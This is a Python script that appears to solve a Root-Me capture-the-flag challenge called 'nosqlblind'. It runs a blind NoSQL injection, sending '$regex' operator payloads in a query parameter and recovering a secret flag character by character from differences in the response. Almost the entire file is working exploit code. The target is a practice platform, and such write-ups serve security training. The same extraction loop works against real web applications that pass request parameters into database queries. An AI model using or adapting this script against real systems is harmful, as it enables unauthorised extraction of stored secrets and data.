#!/usr/bin python3
import requests 

url = 'http://challenge01.root-me.org/web-serveur/ch48/'

def escapseMETAcharacter(j): # escapse meta chacracter have special meaning regular expression by backslash
	if j in ('.','[',']','{','}','*','\\','(',')','+','?','|','^','$',):
		return '\\' + j # escapse sequence
	return j

c = ''
for i in range(30):
	for j in range(32,127):
		j = escapseMETAcharacter(chr(j))

		# chall_name not injectable, cause of WAF, pass find substring
		params = {'chall_name':'nosqlblind','flag[$regex]': '^%s' %(c + j)} # ^ regular expression start string +

		r = requests.get(url, params=params)

		if r.text.find('This is not') == -1: # or Y
			c += j
			print('VALID FLAG: %s' %(c))
			break 

